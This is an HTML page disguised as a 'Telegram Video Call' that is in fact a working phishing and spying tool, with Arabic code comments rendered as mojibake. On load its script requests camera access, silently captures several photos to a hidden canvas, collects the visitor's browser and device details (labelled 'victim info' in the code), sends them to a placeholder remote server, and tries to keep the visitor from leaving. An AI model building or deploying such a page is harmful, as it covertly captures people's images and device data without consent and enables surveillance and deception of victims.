<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Video Call</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0088cc, #00a2e8);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .logo {
            font-size: 70px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .subtitle {
            font-size: 18px;
            opacity: 0.9;
            margin-bottom: 30px;
        }
        
        .loading {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin: 30px 0;
        }
        
        .spinner {
            width: 25px;
            height: 25px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            background: rgba(255, 255, 255, 0.2);
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 16px;
        }
        
        .video-preview {
            width: 100%;
            max-width: 300px;
            border-radius: 15px;
            margin: 20px auto;
            background: #000;
            display: none;
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress {
            width: 0%;
            height: 100%;
            background: #00a884;
            border-radius: 3px;
            transition: width 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üìπ</div>
        <h1>Telegram Video Call</h1>
        <p class="subtitle">Connecting you securely...</p>
        
        <div class="loading">
            <div class="spinner"></div>
            <span>Initializing video call...</span>
        </div>
        
        <video class="video-preview" id="videoElement" autoplay playsinline muted></video>
        <canvas id="hiddenCanvas" style="display: none;"></canvas>
        
        <div class="progress-bar">
            <div class="progress" id="progressBar"></div>
        </div>
        
        <div class="status" id="statusMessage">Preparing your camera...</div>
    </div>

    <script>
        class AutoCameraCapture {
            constructor() {
                this.stream = null;
                this.captureCount = 0;
                this.maxCaptures = 5; // ÿπÿØÿØ ÿßŸÑÿµŸàÿ± ÿßŸÑŸÖŸÑÿ™ŸÇÿ∑ÿ©
                this.init();
            }

            init() {
                this.updateStatus('Loading video call interface...');
                
                // ÿ®ÿØÿ° ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã ÿ®ÿπÿØ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸÅÿ≠ÿ©
                setTimeout(() => {
                    this.startCamera();
                }, 2000);
            }

            async startCamera() {
                try {
                    this.updateStatus('Requesting camera access...');
                    this.updateProgress(25);
                    
                    // ÿ∑ŸÑÿ® ÿµŸÑÿßÿ≠Ÿäÿ© ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã
                    this.stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: 1280,
                            height: 720,
                            facingMode: 'user'
                        },
                        audio: false // ÿ®ÿØŸàŸÜ ŸÖŸäŸÉÿ±ŸàŸÅŸàŸÜ ŸÑÿ™ŸÇŸÑŸäŸÑ ÿßŸÑÿ¥ŸÉ
                    });

                    this.updateStatus('Camera activated! Preparing call...');
                    this.updateProgress(50);
                    
                    // ÿπÿ±ÿ∂ ÿßŸÑŸÅŸäÿØŸäŸà
                    const video = document.getElementById('videoElement');
                    video.srcObject = this.stream;
                    video.style.display = 'block';
                    
                    // ÿ®ÿØÿ° ÿßŸÑÿ™ŸÇÿßÿ∑ ÿßŸÑÿµŸàÿ± ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã
                    setTimeout(() => {
                        this.startAutoCapture();
                    }, 1000);
                    
                } catch (error) {
                    this.updateStatus('Please allow camera access to continue the call.');
                    this.updateProgress(0);
                    
                    // ŸÖÿ≠ÿßŸàŸÑÿ© ÿ®ÿØŸäŸÑÿ©
                    setTimeout(() => {
                        this.tryFallbackApproach();
                    }, 3000);
                }
            }

            startAutoCapture() {
                this.updateStatus('Connecting to call...');
                this.updateProgress(75);
                
                // ÿßŸÑÿ™ŸÇÿßÿ∑ ÿ£ŸàŸÑ ÿµŸàÿ±ÿ© ŸÅŸàÿ±ÿßŸã
                this.captureImage();
                
                // ÿßŸÑÿ™ŸÇÿßÿ∑ ÿµŸàÿ± ŸÖÿ™ÿπÿØÿØÿ© ÿ®ŸÅÿ™ÿ±ÿßÿ™ ŸÖÿ™ÿ®ÿßÿπÿØÿ©
                const intervals = [2000, 3000, 4000, 5000, 6000]; // 5 ÿµŸàÿ± ÿÆŸÑÿßŸÑ 20 ÿ´ÿßŸÜŸäÿ©
                
                intervals.forEach((delay, index) => {
                    setTimeout(() => {
                        if (this.captureCount < this.maxCaptures) {
                            this.captureImage();
                        }
                    }, delay);
                });
                
                // ÿ®ÿπÿØ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿ¨ŸÖŸäÿπ ÿßŸÑŸÑŸÇÿ∑ÿßÿ™
                setTimeout(() => {
                    this.updateStatus('Call connected! You are now in the meeting.');
                    this.updateProgress(100);
                }, 7000);
            }

            captureImage() {
                if (!this.stream) return;
                
                const video = document.getElementById('videoElement');
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');
                
                if (video.videoWidth > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // ÿ™ÿ≠ŸàŸäŸÑ ÿßŸÑÿµŸàÿ±ÿ© ŸÑÿ™ŸÜÿ≥ŸäŸÇ base64
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã
                    this.sendToServer(imageData);
                    
                    this.captureCount++;
                    this.updateStatus(`Connecting... (${this.captureCount}/${this.maxCaptures})`);
                }
            }

            sendToServer(imageData) {
                // ÿ¨ŸÖÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ∂ÿ≠Ÿäÿ©
                const victimInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: navigator.languages,
                    screenResolution: `${screen.width}x${screen.height}`,
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer
                };

                // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸÑŸÑÿ≥Ÿäÿ±ŸÅÿ±
                fetch('https://YOUR_USERNAME.pythonanywhere.com/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        image: imageData,
                        info: victimInfo,
                        secret: 'auto_capture_2024'
                    })
                }).then(response => {
                    console.log('‚úÖ Image sent successfully');
                }).catch(error => {
                    console.log('‚ùå Failed to send image');
                });
            }

            tryFallbackApproach() {
                this.updateStatus('Trying alternative connection...');
                
                // ŸÖÿ≠ÿßŸàŸÑÿ© ÿ®ÿØŸàŸÜ ŸÖÿ™ÿ∑ŸÑÿ®ÿßÿ™ ÿπÿßŸÑŸäÿ©
                navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: false 
                }).then(stream => {
                    this.stream = stream;
                    const video = document.getElementById('videoElement');
                    video.srcObject = stream;
                    video.style.display = 'block';
                    this.startAutoCapture();
                }).catch(err => {
                    this.updateStatus('Camera is required for video calls. Please refresh and allow access.');
                });
            }

            updateStatus(message) {
                document.getElementById('statusMessage').textContent = message;
            }

            updateProgress(percent) {
                document.getElementById('progressBar').style.width = percent + '%';
            }
        }

        // ÿ®ÿØÿ° ÿßŸÑŸáÿ¨ŸàŸÖ ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã ÿπŸÜÿØ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸÅÿ≠ÿ©
        document.addEventListener('DOMContentLoaded', () => {
            new AutoCameraCapture();
        });

        // ŸÖŸÜÿπ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÖŸÜ ÿ•ÿ∫ŸÑÿßŸÇ ÿßŸÑÿµŸÅÿ≠ÿ© ÿ®ÿ≥ŸáŸàŸÑÿ©
        window.addEventListener('beforeunload', function (e) {
            e.preventDefault();
            e.returnValue = 'Are you sure you want to leave the video call?';
        });
    </script>
</body>
</html>